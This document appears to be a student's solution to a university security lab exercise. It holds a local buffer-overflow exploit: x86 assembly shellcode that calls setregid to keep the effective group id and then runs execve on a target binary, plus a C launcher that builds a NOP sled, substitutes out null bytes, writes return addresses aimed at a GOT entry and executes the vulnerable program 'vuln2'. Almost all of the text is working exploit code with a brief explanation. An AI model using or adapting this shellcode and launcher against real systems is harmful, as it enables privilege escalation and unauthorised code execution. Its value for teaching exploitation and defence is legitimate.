The assembler code first retrieves the effective group id, then sets the real and effective group id and at last calls the bin grad 
function using linux system calls. To determine the end of the the string 
/bin/grad/ a call directly after the string is used. The position were the 0x00 
is in the code is than the number stored on top of the stack minus 6.

The following c code replaces the terminating 0x00 after the string with a nop 
and adds nops before the shellcode and the return address after the code. 

When the shellcode executes itself it can replace the nop with a terminating 
0x00 by using the method described in the first paragraph.

#------------------------------------------
#---------Assembler code-------------------
#------------------------------------------

#	.file	"expl1b.c"
#	.section	.rodata
#	.align 4

#.data

#.text
#	.globl main
#	.type	main, @function

#create nops
#.rept 370
#     nop
#.endr

.data

.text
	.globl main
	.type main, @function
#.global getegid

main:
getegid:
	subl	%eax, %eax		#clear eax
	movb	$50, %al		#system call 50, getegid
	int		$0x80			

setregid:
	movl	%eax, %ebx		#set the groupid's
	movl 	%eax, %ecx 		#set the groupid's
	subl	%eax, %eax		#clear eax
	movb	$71, %al
	int		$0x80			#system call 71, setregid

jump:
	jmp		stringy			#need to jump to the 'call'

after_jump:

hello_world:
	sub		%eax, %eax
	sub		%ebx, %ebx
	sub		%edx, %edx
	movb	$4, %al
	movb 	$1, %bl
	mov		(%esp), %ecx
	movb	$5, %dl
	int 	$0x80	

execve_prepare:
	movl	(%esp), %ebx
	sub 	%eax, %eax		#clear eax
	sub		%ecx, %ecx		#clear ecx
	sub		%edx, %edx		#clear edx
	movb	$11, %al

	jmp after_string		#jump to after the string

add_zero:
#	mov		%ecx, -6(%esp)	#add terminating 0 after the string, ecx has to be cleared
	mov		(%esp), %edx
	subb	$6, %dl	
	mov 	%ecx, (%edx)
	sub		%edx, %edx		#clear edx

do_execve:
	int		$0x80			#system call 11, execve	

	subl	%eax, %eax		#clear eax
	subl	%ebx, %ebx		#clear ebx
	movb	$1, %al
	int 	$0x80			#system call 1, exit

stringy:
	call 	after_jump		#jump back so that the string is in the %esp
#	.string	"/home/uebungen/dazur/dazur009/grad"
	.string "/bin/grad"
after_string:
	call add_zero
//-----------------------------
//----------Calling c code-----
//-----------------------------

#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

#define NOP 0x90
#define DEFAULT_ADDRESS 0x080497b0 //this points the GOT fprintf table
#define MAX_FILE_SIZE 100

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}


int main(int argc, char **argv){
	//handle arguments
	if(argc<1){
		printf("Please provide at least a buffer size!\n");
		printf("Arguments: 1[opt:vulnerable file name] 2[file with exploit code] 3[buffer size] 4[offset] 5[nop size]\n");
		exit(0);
	}

	int buffer_size = 136;
	int offset = 0;
	int nop_size = 32;
	char *vulnerable_file = "vuln2";
	char *exploit_file = "expl2code.bin";
	
	if(argc>1)
		vulnerable_file = argv[1];
	if(argc>2)
		exploit_file = argv[2];
	if(argc>3)
		buffer_size = atoi(argv[3]);
	if(argc>4)
		offset = atoi(argv[4]);
	if(argc>5)
		nop_size = atoi(argv[5]);

	printf("Buffer size: 			%i\n", buffer_size);
	printf("Offset size: 			%i\n", offset);
	printf("Nop size: 			%i\n", nop_size);
	printf("Vulnerable File: 		%s\n", vulnerable_file);
	printf("Exploit File:			%s\n", exploit_file);

	char buff[buffer_size];
	long *addr_ptr;	
	int addr;

	addr = get_sp();
	printf("Stack pointer is at: 		0x%x\n", addr);

	addr -= offset;
	printf("Using jump address:		0x%x\n", DEFAULT_ADDRESS);

	int i;
	int stupid = 0;

	//printf("Buffer is: %s\n", buff);
  	addr_ptr = (long *) buff;
	//write the assummed address of the shellcode nop-sledge into the buffer
  	for (i = 0; i < buffer_size/4; i++){
    	stupid += 1;
		//*(addr_ptr++) = addr;
		if(offset==0) addr_ptr[i] = DEFAULT_ADDRESS;
		else addr_ptr[i] = addr;
	}
	//printf("Buffer is: %s\n", buff);
	printf("Jump addresses added:		%i\n", stupid);
	//fill the beginning of the buffer with a nop-sledge
  	for (i = 0; i < nop_size; i++){
    	buff[i] = NOP;
	}

	if(offset==0)
		addr_ptr[0] = DEFAULT_ADDRESS+4;
	else
		addr_ptr[0] = addr+4;


	//read exploit from file into buffer
	FILE *f;
	int file;

	unsigned char file_buffer[MAX_FILE_SIZE];
	int fsize;
	
//	f = fopen(exploit_file, "rb");
    file = open(exploit_file, O_RDONLY);
	if (file){
         fsize = read(file, file_buffer, MAX_FILE_SIZE);
//		 fsize = fread(file_buffer, MAX_FILE_SIZE, 1, f);
	}else{
	    // error opening file
		printf("Error opening file\n");
		exit(0);
	}
//	fclose(f);
	printf("Exploit code size is 		%i\n", fsize);	
	//printf("Buffer is %s\n", buff);
	//write the shellcode into the buffer
  	for (i = nop_size; i < nop_size+fsize; i++){
		if(file_buffer[i-nop_size]==0){
			buff[i] = 0x90;
		}else{
    		buff[i] = file_buffer[i-nop_size];
		}
	}

	//termiante array before the return address to trick strlen
	//buff[nop_size+fsize] = '\0';	
	//terminate the array
  	buff[buffer_size - 1] = '\0';

	char *const parmList[] = {vulnerable_file, buff, buff, NULL};
	
	
	printf("Executing...	\n\n");
    execve(parmList[0], parmList, NULL);
  }

